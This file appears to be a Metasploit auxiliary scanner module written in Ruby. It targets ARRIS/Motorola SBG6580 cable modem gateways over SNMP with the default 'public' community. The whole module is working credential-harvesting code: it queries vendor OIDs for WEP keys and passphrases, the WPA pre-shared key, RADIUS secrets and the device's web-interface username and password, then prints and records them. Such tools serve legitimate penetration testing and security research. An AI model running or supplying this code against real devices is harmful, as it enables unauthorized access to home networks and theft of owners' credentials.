##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module',
      'Description' => 'This module allows SNMP enumeration of the ARRIS / Motorola
        SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports wireless
        network keys and information as well as device user interface username
        and password.
        The default community used is "public".',
      'References'  =>
        [
          [ 'URL', 'http://www.arrisi.com/modems/datasheet/SBG6580/SBG6580_UserGuide.pdf' ],
        ],
      'Author'      => 'Matthew Kienow <mkienow[at]inokii.com>',
      'License'     => MSF_LICENSE
    ))
  end

  def run_host(ip)

    begin
      snmp = connect_snmp

      # represents the order of the output data fields
      fields_order = [
        "Host IP", "SSID", "802.11 Band", "Network Authentication Mode",
        "WEP Passphrase", "WEP Encryption", "WEP Key 1", "WEP Key 2",
        "WEP Key 3", "WEP Key 4", "Current Network Key", "WPA Encryption",
        "WPA Pre-Shared Key (PSK)", "Group Key Rotation Interval",
        "RADIUS Server", "RADIUS Port", "RADIUS Key",
        "WPA/WPA2 Re-auth Interval", "Device UI Username", "Device UI Password"
      ]

      output_data = {}
      output_data = {"Host IP" => ip}

      if snmp.get_value('sysDescr.0') =~ /SBG6580/
        # print connected status after the first query so if there are
        # any timeout or connectivity errors; the code would already
        # have jumped to error handling where the error status is
        # already being displayed.
        print_good("#{ip}, Connected.")

        primaryWifiState = snmp.get_value('1.3.6.1.2.1.2.2.1.8.32').to_i
        if primaryWifiState != 1
          # primary Wifi interface is not up
          print_status("Primary WiFi is disabled on the device")
        end

        ssid = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32').to_s
        output_data["SSID"] = ssid.strip

        wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0').to_i
        output_data["802.11 Band"] = get_wireless_band_name(wireless_band)

        network_auth_mode = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.5.32').to_i
        network_auth_mode_name = get_network_auth_mode_name(network_auth_mode)
        output_data["Network Authentication Mode"] = network_auth_mode_name

        case network_auth_mode
        when 1, 6
          # WEP, WEP 802.1x Authentication
          wep_passphrase = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.3.32').to_s
          output_data["WEP Passphrase"] = wep_passphrase.strip

          wep_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.32').to_i
          wep_encryption_name = "unknown"
          wep_key1 = wep_key2 = wep_key3 = wep_key4 = ""
          # get appropriate WEP keys based on wep_encryption setting
          if wep_encryption == 1
            wep_encryption_name = "64-bit"
            # TODO: need to test what to_s does to the SNMP hex-string
            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.1').to_s
            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.2').to_s
            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.3').to_s
            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.4').to_s
          elsif wep_encryption == 2
            wep_encryption_name = "128-bit"
            # TODO: need to test what to_s does to the SNMP hex-string
            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.1').to_s
            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.2').to_s
            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.3').to_s
            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.4').to_s
          end
          output_data["WEP Encryption"] = wep_encryption_name
          output_data["WEP Key 1"] = wep_key1.strip
          output_data["WEP Key 2"] = wep_key2.strip
          output_data["WEP Key 3"] = wep_key3.strip
          output_data["WEP Key 4"] = wep_key4.strip

          # get current network key
          # TODO: need to test what to_i does to Gauge32: Gauge32: 1 / = Gauge32: 2  = Gauge32: 3 = Gauge32: 4
          currentKey = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_i
          output_data["Current Network Key"] = currentKey

          if network_auth_mode == 6
            get_radius_info(snmp, output_data)
          end

        when 2, 3, 4, 5, 7, 8
          # process all flavors of WPA
          wpa_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.1.32').to_i
          output_data["WPA Encryption"] = get_wpa_encryption_name(wpa_encryption)

          wpa_psk = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32').to_s
          output_data["WPA Pre-Shared Key (PSK)"] = wpa_psk.strip
          
          case network_auth_mode
          when 4, 5, 8
            get_radius_info(snmp, output_data)
          end
        end

        # attempt to get the username and password for the device user interface
        # using the CableHome cabhPsDevMib MIB module which defines the
        # basic management objects for the Portal Services (PS) logical element
        # of a CableHome compliant Residential Gateway device
        deviceUiSelection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0').to_i
        if deviceUiSelection == 1
          # manufacturerLocal(1) - indicates Portal Services is using the vendor
          # web user interface shipped with the device
          deviceUiUsername = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
          output_data["Device UI Username"] = deviceUiUsername.strip

          deviceUiPassword = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
          output_data["Device UI Password"] = deviceUiPassword.strip
        end

        # output
        print_line("")
        print_status("System information:\n")
        line = ""
        width = 30  # name field width

        fields_order.each {|k|
          if not output_data.has_key?(k)
            next
          end

          v = output_data[k]
          if (v.nil? or v.empty? or v =~ /Null/)
            v = '-'
          end

          report_note(
            :host  => ip,
            :proto => 'udp',
            :sname => 'snmp',
            :port  => datastore['RPORT'].to_i,
            :type  => "snmp.#{k}",
            :data  => v
          )

          line << sprintf("%s%s: %s\n", k, " "*([0,width-k.length].max), v)
        }

        print_line(line)
        #print_line("")
      end

    rescue SNMP::RequestTimeout
      vprint_status("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_status("#{ip} Connection refused.")
    rescue SNMP::InvalidIpAddress
      print_status("#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.")
    rescue SNMP::UnsupportedVersion
      print_status("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_status("Unknown error: #{e.class} #{e}")
      elog("Unknown error: #{e.class} #{e}")
      elog("Call stack:\n#{e.backtrace.join "\n"}")
    ensure
      disconnect_snmp
    end
  end

  def get_network_auth_mode_name(network_auth_mode)
    case network_auth_mode
    when 0
      "Open Security"
    when 1
      "WEP"
    when 2
      "WPA-PSK"
    when 3
      "WPA2-PSK"
    when 4
      "WPA RADIUS"
    when 5
      "WPA2 RADIUS"
    when 6
      "WEP 802.1x Authentication"
    when 7
      "WPA-PSK and WPA2-PSK"
    when 8
      "WPA and WPA2 RADIUS"
    else
      "Unknown"
    end
  end

  def get_wireless_band_name(wireless_band)
    case wireless_band
    when 1
      "2.4 Ghz"
    when 2
      "5 Ghz"
    else
      "Unknown"
    end
  end

  def get_wpa_encryption_name(wpa_encryption)
    case wpa_encryption
    when 2
      "AES"
    when 3
      "TKIP+AES"
    else
      "Unknown"
    end
  end

  def get_radius_info(snmp, output_data)
    radius_server = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.32').to_s
    # TODO: Hex-STRING IP Address hex value of each octet, convert hex octets to IP address 
    output_data["RADIUS Server"] = radius_server.strip

    radius_port = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.3.32').to_i
    # TODO does Gauge32 convert to int?
    output_data["RADIUS Port"] = radius_port

    radius_key = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.4.32').to_s
    output_data["RADIUS Key"] = radius_key.strip
  end

end
